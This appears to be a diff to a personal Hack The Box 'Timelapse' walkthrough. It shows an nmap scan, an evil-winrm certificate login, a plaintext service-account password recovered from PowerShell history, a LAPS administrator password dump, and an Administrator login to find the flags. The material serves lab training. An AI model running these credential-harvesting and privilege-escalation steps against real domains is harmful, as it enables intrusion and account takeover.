@@ -3,60 +3,54 @@
 ### NMAP
 
 ``` Console
-noob2uub@kali:~/Documents/HTB/Timelapse$ nmap -p- -sC -sV -oN ports -Pn 10.10.11.152
-Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-18 10:45 PDT
-Stats: 0:06:10 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
-Connect Scan Timing: About 30.34% done; ETC: 11:05 (0:14:10 remaining)
-Stats: 0:08:22 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
-Connect Scan Timing: About 41.49% done; ETC: 11:05 (0:11:48 remaining)
-Stats: 0:11:39 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
-Connect Scan Timing: About 57.21% done; ETC: 11:05 (0:08:44 remaining)
-Stats: 0:13:49 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
-Connect Scan Timing: About 66.57% done; ETC: 11:06 (0:06:57 remaining)
-Stats: 0:15:31 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
-Connect Scan Timing: About 76.86% done; ETC: 11:05 (0:04:40 remaining)
+noob2uub@kali:~/Documents/HTB/Timelapse$ nmap -sC -sV -Pn -p 1-65535 10.10.11.152
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-18 12:44 PDT
+Stats: 0:07:03 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 25.26% done; ETC: 13:12 (0:20:54 remaining)
 Nmap scan report for 10.10.11.152
-Host is up (0.072s latency).
+Host is up (0.074s latency).
 Not shown: 65517 filtered tcp ports (no-response)
-PORT      STATE SERVICE       VERSION
-53/tcp    open  domain        Simple DNS Plus
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-19 02:03:46Z)
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+PORT      STATE SERVICE           VERSION
+53/tcp    open  domain            Simple DNS Plus
+88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-04-19 04:17:16Z)
+135/tcp   open  msrpc             Microsoft Windows RPC
+139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
 445/tcp   open  microsoft-ds?
 464/tcp   open  kpasswd5?
-593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  tcpwrapped
-3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
-3269/tcp  open  tcpwrapped
+593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ldapssl?
+3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  globalcatLDAPssl?
+5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
 | tls-alpn: 
 |_  http/1.1
-|_ssl-date: 2022-04-19T02:05:17+00:00; +7h58m55s from scanner time.
+|_ssl-date: 2022-04-19T04:18:46+00:00; +7h58m54s from scanner time.
 | ssl-cert: Subject: commonName=dc01.timelapse.htb
 | Not valid before: 2021-10-25T14:05:29
 |_Not valid after:  2022-10-25T14:25:29
-|_http-server-header: Microsoft-HTTPAPI/2.0
-9389/tcp  open  mc-nmf        .NET Message Framing
-49667/tcp open  msrpc         Microsoft Windows RPC
-49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-49674/tcp open  msrpc         Microsoft Windows RPC
-49696/tcp open  msrpc         Microsoft Windows RPC
-60597/tcp open  msrpc         Microsoft Windows RPC
+9389/tcp  open  mc-nmf            .NET Message Framing
+49667/tcp open  msrpc             Microsoft Windows RPC
+49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc             Microsoft Windows RPC
+49696/tcp open  msrpc             Microsoft Windows RPC
+60597/tcp open  msrpc             Microsoft Windows RPC
 Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
-|_clock-skew: mean: 7h58m54s, deviation: 0s, median: 7h58m53s
-| smb2-time: 
-|   date: 2022-04-19T02:04:38
-|_  start_date: N/A
 | smb2-security-mode: 
 |   3.1.1: 
 |_    Message signing enabled and required
+|_clock-skew: mean: 7h58m53s, deviation: 0s, median: 7h58m53s
+| smb2-time: 
+|   date: 2022-04-19T04:18:08
+|_  start_date: N/A
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 1256.74 seconds
+Nmap done: 1 IP address (1 host up) scanned in 2116.31 seconds
+
 
 ```
 We see that port 139 and port 446 are open so lets take a look at SMBMAP
@@ -259,5 +253,327 @@ nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
 -----END CERTIFICATE-----
 ```
 
+I created a timeless.cert and timeless.key (meant timelapse, but typed it out  wrong)
 
+I did get stumped on this one, so I found out about evil-winrm and installed that on my machine and ran it.
+
+### Evil-WINRM
+
+``` console
+noob2uub@kali:~/Documents/HTB/Timelapse$ evil-winrm -S -i 10.10.11.152 -c timless.cert -k timeless.key  -P 5986
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Warning: SSL enabled
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\legacyy\Documents> 
+```
+
+This provided me a low level shell, now lets hunt for the user flag and then attempt to escalate priveledges. 
+
+```console
+*Evil-WinRM* PS C:\Users\legacyy\Documents> cd ..
+*Evil-WinRM* PS C:\Users\legacyy> ls
+
+
+    Directory: C:\Users\legacyy
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---       10/25/2021   8:25 AM                Desktop
+d-r---       10/25/2021   8:22 AM                Documents
+d-r---        9/15/2018  12:19 AM                Downloads
+d-r---        9/15/2018  12:19 AM                Favorites
+d-r---        9/15/2018  12:19 AM                Links
+d-r---        9/15/2018  12:19 AM                Music
+d-r---        9/15/2018  12:19 AM                Pictures
+d-----        9/15/2018  12:19 AM                Saved Games
+d-r---        9/15/2018  12:19 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\legacyy> cd Desktop
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> ls
+
+
+    Directory: C:\Users\legacyy\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        4/18/2022   6:24 PM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> cat user.txt
+```
+
+# Priveledge Escalation
+
+Lets look around for what has been run in powershell to find out more information. Looking into the Users folder I found a svc_deploy user account. I found this site that will help me navigate to the powershell history file.
+
+### Dir - Force (to show hidden folders)
+
+```console
+*Evil-WinRM* PS C:\Users\legacyy> dir -Force
+
+
+    Directory: C:\Users\legacyy
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d--h--       10/25/2021   8:22 AM                AppData
+d--hsl       10/25/2021   8:22 AM                Application Data
+d--hsl       10/25/2021   8:22 AM                Cookies
+d-r---       10/25/2021   8:25 AM                Desktop
+d-r---       10/25/2021   8:22 AM                Documents
+d-r---        9/15/2018  12:19 AM                Downloads
+d-r---        9/15/2018  12:19 AM                Favorites
+d-r---        9/15/2018  12:19 AM                Links
+d--hsl       10/25/2021   8:22 AM                Local Settings
+d-r---        9/15/2018  12:19 AM                Music
+d--hsl       10/25/2021   8:22 AM                My Documents
+d--hsl       10/25/2021   8:22 AM                NetHood
+d-r---        9/15/2018  12:19 AM                Pictures
+d--hsl       10/25/2021   8:22 AM                PrintHood
+d--hsl       10/25/2021   8:22 AM                Recent
+d-----        9/15/2018  12:19 AM                Saved Games
+d--hsl       10/25/2021   8:22 AM                SendTo
+d--hsl       10/25/2021   8:22 AM                Start Menu
+d--hsl       10/25/2021   8:22 AM                Templates
+d-r---        9/15/2018  12:19 AM                Videos
+-a-h--         3/3/2022  10:10 PM         262144 NTUSER.DAT
+-a-hs-       10/25/2021   8:22 AM          61440 ntuser.dat.LOG1
+-a-hs-       10/25/2021   8:22 AM          65536 ntuser.dat.LOG2
+-a-hs-       10/25/2021   8:22 AM          65536 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf
+-a-hs-       10/25/2021   8:22 AM         524288 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms
+-a-hs-       10/25/2021   8:22 AM         524288 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms
+---hs-       10/25/2021   8:22 AM             20 ntuser.ini
+
+
+*Evil-WinRM* PS C:\Users\legacyy> 
+```
+
+### Powershell History (consolehost_history.txt)
+
+```console
+Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> ls
+
+
+    Directory: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         3/3/2022  11:46 PM            434 ConsoleHost_history.txt
+
+
+*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> cat ConsoleHost_history.txt
+whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit
+*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> 
+```
+When reading the ConsoleHost_History.txt I decided to run those commands since it looks like it changes users to svc_deploy
+
+``` console
+*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> cat ConsoleHost_history.txt
+whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit
+*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> invoke-command -computername localhost -credential $c -port 5986 -usessl -
+The value of the FilePath parameter must be a Windows PowerShell script file. Enter the path to a file with a .ps1 file name extension and try the command again.
+Parameter name: filePath
+At line:1 char:1
++ invoke-command -computername localhost -credential $c -port 5986 -use ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Invoke-Command], ArgumentException
+    + FullyQualifiedErrorId : System.ArgumentException,Microsoft.PowerShell.Commands.InvokeCommandCommand
+*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> SessionOption $so -scriptblock {whoami}
+The term 'SessionOption' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ SessionOption $so -scriptblock {whoami}
++ ~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (SessionOption:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> invoke-command -computername localhost -credential $c -port 5986 -usessl -
+The value of the FilePath parameter must be a Windows PowerShell script file. Enter the path to a file with a .ps1 file name extension and try the command again.
+Parameter name: filePath
+At line:1 char:1
++ invoke-command -computername localhost -credential $c -port 5986 -use ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Invoke-Command], ArgumentException
+    + FullyQualifiedErrorId : System.ArgumentException,Microsoft.PowerShell.Commands.InvokeCommandCommand
+*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> SessionOption $so -scriptblock {whoami}
+The term 'SessionOption' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ SessionOption $so -scriptblock {whoami}
++ ~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (SessionOption:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
+timelapse\svc_deploy
+*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {net user svc_deploy}
+User name                    svc_deploy
+Full Name                    svc_deploy
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/25/2021 12:12:37 PM
+Password expires             Never
+Password changeable          10/26/2021 12:12:37 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   4/18/2022 9:27:13 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *LAPS_Readers         *Domain Users
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> 
+```
+For more information on LAPS files and retrieving passwords https://smarthomepursuits.com/export-laps-passwords-powershell/
+
+Now lets run this command to pull the passwords from the LAPS File
+
+```console
+*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}
+
+
+PSComputerName              : localhost
+RunspaceId                  : d416ee51-82f0-43f4-89ec-99b3d038a162
+DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
+DNSHostName                 : dc01.timelapse.htb
+Enabled                     : True
+ms-Mcs-AdmPwd               : {c8/;-8W6Si[r87qyj@FG26M
+ms-Mcs-AdmPwdExpirationTime : 132952370720148803
+Name                        : DC01
+ObjectClass                 : computer
+ObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f
+SamAccountName              : DC01$
+SID                         : S-1-5-21-671920749-559770252-3318990721-1000
+UserPrincipalName           :
+
+PSComputerName    : localhost
+RunspaceId        : d416ee51-82f0-43f4-89ec-99b3d038a162
+DistinguishedName : CN=DB01,OU=Database,OU=Servers,DC=timelapse,DC=htb
+DNSHostName       :
+Enabled           : True
+Name              : DB01
+ObjectClass       : computer
+ObjectGUID        : d38b3265-230f-47ae-bdcd-f7153da7659d
+SamAccountName    : DB01$
+SID               : S-1-5-21-671920749-559770252-3318990721-1606
+UserPrincipalName :
+
+PSComputerName    : localhost
+RunspaceId        : d416ee51-82f0-43f4-89ec-99b3d038a162
+DistinguishedName : CN=WEB01,OU=Web,OU=Servers,DC=timelapse,DC=htb
+DNSHostName       :
+Enabled           : True
+Name              : WEB01
+ObjectClass       : computer
+ObjectGUID        : 897c7cfe-ba15-4181-8f2c-a74f88952683
+SamAccountName    : WEB01$
+SID               : S-1-5-21-671920749-559770252-3318990721-1607
+UserPrincipalName :
+
+PSComputerName    : localhost
+RunspaceId        : d416ee51-82f0-43f4-89ec-99b3d038a162
+DistinguishedName : CN=DEV01,OU=Dev,OU=Servers,DC=timelapse,DC=htb
+DNSHostName       :
+Enabled           : True
+Name              : DEV01
+ObjectClass       : computer
+ObjectGUID        : 02dc961a-7a60-4ec0-a151-0472768814ca
+SamAccountName    : DEV01$
+SID               : S-1-5-21-671920749-559770252-3318990721-1608
+UserPrincipalName :
+
+```
+### Privledge Escalation with Evil-WINRM
+
+```console
+noob2uub@kali:~/Documents/HTB/Timelapse$ evil-winrm -S -i 10.10.11.152 -u Administrator {c8/;-8W6Si[r87qyj@FG26M 
+Enter Password: 
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Warning: SSL enabled
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
+```
+So I am now in Administrator so just have to find the root flag. 
+
+After hunting around for a while, I decided to look in other User folders and found TRX. 
+
+```console
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> cd ..
+*Evil-WinRM* PS C:\Users> ls
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       10/23/2021  11:27 AM                Administrator
+d-----       10/25/2021   8:22 AM                legacyy
+d-r---       10/23/2021  11:27 AM                Public
+d-----       10/25/2021  12:23 PM                svc_deploy
+d-----        2/23/2022   5:45 PM                TRX
+
+
+*Evil-WinRM* PS C:\Users> cd TRX
+*Evil-WinRM* PS C:\Users\TRX> cd Desktop
+*Evil-WinRM* PS C:\Users\TRX\Desktop> ls
+
+
+    Directory: C:\Users\TRX\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        4/18/2022   6:24 PM             34 root.txt
+```
 
